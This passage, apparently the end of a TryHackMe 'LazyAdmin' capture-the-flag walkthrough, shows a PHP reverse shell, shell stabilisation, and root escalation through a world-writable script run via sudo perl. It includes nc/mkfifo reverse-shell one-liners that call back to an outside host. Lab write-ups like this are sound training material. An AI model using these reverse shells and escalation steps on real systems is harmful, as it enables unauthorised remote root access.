+#note the port number is the number which you set on the php code</code></pre><figure id="1443ca05-5228-40bb-b9a8-0297fd40b708" class="image"><a href="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%206.png"><img style="width:1366px" src="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%206.png"/></a></figure><p id="9b37d759-b2b4-48f1-9cdb-54e0236bfb97" class="">Now clicking the php file we got our reverse shell </p><figure id="5cd8ae34-8ffd-4f2c-8ecd-a8b6c73223a1" class="image"><a href="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%207.png"><img style="width:1366px" src="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%207.png"/></a></figure><p id="23bf8ddd-6b10-4645-8103-33a5523c9266" class="">perfecto…</p><p id="9f4cc883-09cb-4d6c-8779-aac3e87fbd70" class="">Now time to stabilize the shell</p><p id="cc82f461-d10e-4724-9a48-d493c19422da" class="">
+</p><pre id="d173231c-6861-4cfd-894d-4ae1542c0898" class="code"><code>$ python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+Press CTRL+Z to backgroud the process 
+Now in you home terminal type 
+$ echo $TERM
+$ stty raw -echo &amp;&amp; fg
+	Then type &#x27;reset&#x27;
+After that it will ask for terminal type 
+type the output that you got form echo $TERM</code></pre><p id="3b819697-6a14-4dcf-9ba5-f2c0a4e180b2" class="">Done….</p><p id="61d95410-35d5-423a-a468-9d84b65429ed" class="">Time to get user flag</p><pre id="4a272eb1-04a1-4622-aa99-8e4ceb1c4aca" class="code"><code>www-data@THM-Chal:/tmp$ cd /home
+www-data@THM-Chal:/home$ ls
+itguy
+www-data@THM-Chal:/home$ cd itguy/
+www-data@THM-Chal:/home/itguy$ ls
+Desktop    Downloads  Pictures	Templates  backup.pl	     mysql_login.txt
+Documents  Music      Public	Videos	   examples.desktop  user.txt
+www-data@THM-Chal:/home/itguy$ cat user.txt 
+THM{**********************}
+www-data@THM-Chal:/home/itguy$</code></pre><p id="fb315039-723c-4da1-ab18-51ad23718461" class="">Now its time to be root.</p><pre id="f6f94d0d-d37b-4612-927d-878d954265d5" class="code"><code>www-data@THM-Chal:/home/itguy$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+www-data@THM-Chal:/home/itguy$</code></pre><p id="1c5174e4-5156-468c-ac1e-626db507e606" class="">This seems interesting it means that perl can be run as sudo and we already see <code>backup.pl</code></p><pre id="08b1fa69-167b-405a-ae00-f53d45e7fb09" class="code"><code>www-data@THM-Chal:/home/itguy$ cat backup.pl 
+#!/usr/bin/perl
+
+system(&quot;sh&quot;, &quot;/etc/copy.sh&quot;);</code></pre><pre id="2345725a-1c87-4d54-aae4-d2f9ac243dc2" class="code"><code>www-data@THM-Chal:/home/itguy$ ls -lah /etc/copy.sh
+-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh</code></pre><pre id="ab03face-bc2c-486d-9cdf-cea56275dedc" class="code"><code>www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;/tmp/f</code></pre><p id="e2fee97d-a26c-40e1-a33e-90575f8453ab" class="">It seems like there is a reverse shell or some thing lets modify this one</p><pre id="9e0283b4-1287-4820-ad40-d27505e6376e" class="code"><code>www-data@THM-Chal:/home/itguy$ echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc {tun0 address} 1997 &gt;/tmp/f&quot;  &gt; /etc/copy.sh</code></pre><p id="7e16e154-9ea3-4560-99ff-6f5b80398e0a" class="">Now lets run a listener on our home terminal</p><pre id="ef4f8d47-a540-4852-9e61-f2d697e12bde" class="code"><code>$ nc -lvnp 1997</code></pre><p id="5b43f4ec-34bb-4a88-a4e1-fff75787b1e0" class="">Run the command on www-data reverse shell</p><pre id="f3867a9a-f4d3-44a6-bbd9-453c229aa278" class="code"><code>www-data@THM-Chal:/home/itguy$ sudo  /usr/bin/perl /home/itguy/backup.pl</code></pre><p id="b67eb1c0-7710-4d2a-9484-5e7379012284" class="">After running this we get connection back</p><pre id="1e760e05-7de4-4464-beb5-06a1f86d00c7" class="code"><code>[selenophilem7@Tadashi]-[~/Documents/Hacking/TryHackMe/LazyAdmin]
+&gt;&gt;&gt; nc -lvnp 1997
+Connection from 10.10.201.192:43734
+	#</code></pre><p id="32d29f5b-3630-4778-bbec-1acb180f75fc" class="">Final step</p><pre id="f01c7a27-9cf5-493d-be5c-560ae7bd21fd" class="code"><code># whoami
+root
+# ls /root/  	
+root.txt
+# cat /root/root.txt
+THM{*************}
+# exit</code></pre><p id="7358764b-8150-4d33-a55e-f1ddc43c4a31" class="">And Perfecto we completed the lab</p></div></article></body></html>
